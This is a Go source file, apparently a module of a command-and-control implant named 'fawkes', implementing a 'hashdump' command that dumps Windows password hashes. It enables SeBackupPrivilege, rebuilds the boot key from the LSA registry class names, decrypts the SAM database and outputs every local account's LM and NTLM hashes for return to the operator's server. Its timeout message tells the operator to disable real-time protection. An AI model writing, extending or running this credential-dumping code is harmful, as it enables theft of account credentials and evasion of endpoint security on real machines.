//go:build windows
// +build windows

package commands

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32HD           = windows.NewLazySystemDLL("advapi32.dll")
	procRegQueryInfoKeyW = advapi32HD.NewProc("RegQueryInfoKeyW")
	procRegQueryValueExW = advapi32HD.NewProc("RegQueryValueExW")
	procRegEnumKeyExW    = advapi32HD.NewProc("RegEnumKeyExW")
)

const (
	hkeyLocalMachine       = uintptr(0x80000002)
	regOptionBackupRestore = 0x00000004
)

// HashdumpCommand implements local SAM hash extraction
type HashdumpCommand struct{}

func (c *HashdumpCommand) Name() string {
	return "hashdump"
}

func (c *HashdumpCommand) Description() string {
	return "Extract local account NTLM hashes from the SAM database (requires SYSTEM privileges)"
}

type hashdumpArgs struct {
	Format string `json:"format"`
}

func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
	// Run with a timeout to prevent hanging the agent if security software
	// blocks SAM registry access (observed on Windows 11 with Defender).
	resultCh := make(chan structs.CommandResult, 1)
	go func() {
		innerResult := c.executeInner(task)
		diagHashdump("goroutine-defers-done, sending on channel")
		resultCh <- innerResult
		diagHashdump("goroutine-channel-send-done")
	}()

	diagHashdump("execute-waiting-on-channel")
	select {
	case result := <-resultCh:
		diagHashdump("execute-received-result status=" + result.Status)
		return result
	case <-time.After(60 * time.Second):
		diagHashdump("execute-TIMEOUT-60s")
		return errorf("Hashdump timed out after 60s — security software may be blocking SAM registry access.\nConsider disabling real-time protection or using an alternative credential dumping method.")
	}
}

// diagHashdump writes a diagnostic marker for the hashdump crash investigation.
// TODO: Remove after investigation is resolved.
func diagHashdump(step string) {
	f, err := os.OpenFile(os.TempDir()+`\fawkes_diag.txt`, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s [hashdump-inner] %s\n", time.Now().Format("15:04:05.000"), step)
}

func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult {
	// Note: runtime.LockOSThread() was removed — SYSTEM process token grants
	// SeBackupPrivilege on all threads, and LockOSThread was causing process
	// crashes during response delivery after hashdump completed.

	var args hashdumpArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	// Enable SeBackupPrivilege on both process and thread tokens
	// Thread token is needed when impersonating SYSTEM via getsystem
	enableBackupPrivilege()
	enableThreadBackupPrivilege()

	// Step 1: Extract boot key from SYSTEM hive
	bootKey, err := extractBootKey()
	if err != nil {
		return errorf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err)
	}
	defer structs.ZeroBytes(bootKey)

	// Step 2: Read SAM F value and derive hashed boot key
	hashedBootKey, samRevision, err := deriveHashedBootKey(bootKey)
	if err != nil {
		return errorf("Failed to derive hashed boot key: %v", err)
	}
	defer structs.ZeroBytes(hashedBootKey)

	// Step 3: Enumerate user accounts and extract hashes
	users, err := enumerateAndDecryptUsers(hashedBootKey, samRevision)
	if err != nil {
		return errorf("Failed to enumerate users: %v", err)
	}
	defer func() {
		diagHashdump("defer-zerostring-start")
		for i := range users {
			structs.ZeroString(&users[i].lmHash)
			structs.ZeroString(&users[i].ntHash)
		}
		diagHashdump("defer-zerostring-done")
	}()

	if len(users) == 0 {
		return errorResult("No user accounts found in SAM database.")
	}

	// Format output — credentials are registered via ProcessResponse hook on the server side
	var sb strings.Builder
	for _, u := range users {
		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
	}

	diagHashdump(fmt.Sprintf("executeInner-returning users=%d output_len=%d", len(users), sb.Len()))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// regOpenKey opens a registry key using the Go stdlib windows.RegOpenKeyEx.
// As SYSTEM or with SeBackupPrivilege, KEY_READ is sufficient to access
// restricted keys (SAM, SECURITY) without special ulOptions flags.
func regOpenKey(root uintptr, path string) (uintptr, error) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return 0, fmt.Errorf("invalid path %q: %v", path, err)
	}
	var hKey windows.Handle
	regerr := windows.RegOpenKeyEx(windows.Handle(root), pathPtr, 0, windows.KEY_READ, &hKey)
	if regerr != nil {
		return 0, fmt.Errorf("RegOpenKeyEx(%s): %v", path, regerr)
	}
	return uintptr(hKey), nil
}

// regCloseKey closes a registry key handle
func regCloseKey(hKey uintptr) {
	windows.RegCloseKey(windows.Handle(hKey))
}

// regQueryClassName reads the class name of a registry key
func regQueryClassName(hKey uintptr) (string, error) {
	classNameBuf := make([]uint16, 256)
	classNameLen := uint32(256)
	ret, _, err := procRegQueryInfoKeyW.Call(
		hKey,
		uintptr(unsafe.Pointer(&classNameBuf[0])),
		uintptr(unsafe.Pointer(&classNameLen)),
		0, 0, 0, 0, 0, 0, 0, 0, 0,
	)
	if ret != 0 {
		return "", fmt.Errorf("RegQueryInfoKeyW: %v (code %d)", err, ret)
	}
	return windows.UTF16ToString(classNameBuf[:classNameLen]), nil
}

// regQueryValue reads a registry value
func regQueryValue(hKey uintptr, valueName string) ([]byte, error) {
	var namePtr *uint16
	if valueName != "" {
		namePtr, _ = windows.UTF16PtrFromString(valueName)
	}

	// First call to get size
	var dataSize uint32
	ret, _, _ := procRegQueryValueExW.Call(
		hKey,
		uintptr(unsafe.Pointer(namePtr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&dataSize)),
	)
	if ret != 0 || dataSize == 0 {
		return nil, fmt.Errorf("RegQueryValueExW size query failed (code %d)", ret)
	}

	// Second call to get data
	data := make([]byte, dataSize)
	ret, _, err := procRegQueryValueExW.Call(
		hKey,
		uintptr(unsafe.Pointer(namePtr)),
		0, 0,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(unsafe.Pointer(&dataSize)),
	)
	if ret != 0 {
		return nil, fmt.Errorf("RegQueryValueExW: %v (code %d)", err, ret)
	}
	// Guard against dataSize growing between calls (TOCTOU)
	if dataSize > uint32(len(data)) {
		dataSize = uint32(len(data))
	}
	return data[:dataSize], nil
}

// regEnumSubkeys enumerates subkeys of a registry key
func regEnumSubkeys(hKey uintptr) ([]string, error) {
	var subkeys []string
	for i := uint32(0); ; i++ {
		nameBuf := make([]uint16, 256)
		nameLen := uint32(256)
		ret, _, _ := procRegEnumKeyExW.Call(
			hKey,
			uintptr(i),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
			0, 0, 0, 0,
		)
		if ret != 0 {
			break // ERROR_NO_MORE_ITEMS or other error
		}
		subkeys = append(subkeys, windows.UTF16ToString(nameBuf[:nameLen]))
	}
	return subkeys, nil
}

// extractBootKey reads the 4 LSA subkey class names and derives the boot key
func extractBootKey() ([]byte, error) {
	lsaKeys := []string{"JD", "Skew1", "GBG", "Data"}
	var scrambled []byte

	for _, keyName := range lsaKeys {
		path := fmt.Sprintf(`SYSTEM\CurrentControlSet\Control\Lsa\%s`, keyName)
		hKey, err := regOpenKey(hkeyLocalMachine, path)
		if err != nil {
			return nil, fmt.Errorf("open %s: %v", keyName, err)
		}
		className, err := regQueryClassName(hKey)
		regCloseKey(hKey)
		if err != nil {
			return nil, fmt.Errorf("class name %s: %v", keyName, err)
		}
		decoded, err := hex.DecodeString(className)
		if err != nil {
			return nil, fmt.Errorf("decode %s class '%s': %v", keyName, className, err)
		}
		scrambled = append(scrambled, decoded...)
	}

	if len(scrambled) != 16 {
		return nil, fmt.Errorf("boot key scrambled length %d, expected 16", len(scrambled))
	}

	// Apply permutation
	bootKey := make([]byte, 16)
	for i := 0; i < 16; i++ {
		bootKey[i] = scrambled[bootKeyPerm[i]]
	}
	return bootKey, nil
}

// deriveHashedBootKey reads SAM F value and derives the hashed boot key
func deriveHashedBootKey(bootKey []byte) ([]byte, byte, error) {
	hKey, err := regOpenKey(hkeyLocalMachine, `SAM\SAM\Domains\Account`)
	if err != nil {
		return nil, 0, fmt.Errorf("open SAM Account: %v", err)
	}
	defer regCloseKey(hKey)

	fValue, err := regQueryValue(hKey, "F")
	if err != nil {
		return nil, 0, fmt.Errorf("read F value: %v", err)
	}

	if len(fValue) < 0x70 {
		return nil, 0, fmt.Errorf("f value too short (%d bytes)", len(fValue))
	}

	// Key0 starts at offset 0x68
	samRevision := fValue[0x68]

	switch samRevision {
	case 0x01:
		return deriveHashedBootKeyRC4(fValue, bootKey)
	case 0x02:
		return deriveHashedBootKeyAES(fValue, bootKey)
	default:
		return nil, 0, fmt.Errorf("unknown SAM key revision: 0x%02x", samRevision)
	}
}

// enumerateAndDecryptUsers reads all user accounts from SAM and decrypts their hashes
func enumerateAndDecryptUsers(hashedBootKey []byte, samRevision byte) ([]userHash, error) {
	usersPath := `SAM\SAM\Domains\Account\Users`
	hUsersKey, err := regOpenKey(hkeyLocalMachine, usersPath)
	if err != nil {
		return nil, fmt.Errorf("open Users key: %v", err)
	}
	defer regCloseKey(hUsersKey)

	subkeys, err := regEnumSubkeys(hUsersKey)
	if err != nil {
		return nil, fmt.Errorf("enum subkeys: %v", err)
	}

	var users []userHash
	for _, sk := range subkeys {
		if strings.EqualFold(sk, "Names") {
			continue
		}

		// Parse RID from hex subkey name
		rid64, err := parseHexUint32(sk)
		if err != nil {
			continue
		}
		rid := uint32(rid64)

		userPath := fmt.Sprintf(`%s\%s`, usersPath, sk)
		hUserKey, err := regOpenKey(hkeyLocalMachine, userPath)
		if err != nil {
			continue
		}

		vValue, err := regQueryValue(hUserKey, "V")
		regCloseKey(hUserKey)
		if err != nil {
			continue
		}

		u, err := parseUserVValue(vValue, rid, hashedBootKey, samRevision)
		if err != nil {
			continue
		}
		users = append(users, *u)
	}

	return users, nil
}

// enableBackupPrivilege enables SeBackupPrivilege on the current process token
func enableBackupPrivilege() error {
	var token windows.Token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("failed to get current process handle: %w", err)
	}
	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup SeBackupPrivilege LUID: %w", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}

// enableThreadBackupPrivilege enables SeBackupPrivilege on the current thread's
// impersonation token (needed when running under getsystem)
func enableThreadBackupPrivilege() error {
	var token windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
	if err != nil {
		return fmt.Errorf("failed to open thread token: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup SeBackupPrivilege LUID: %w", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}
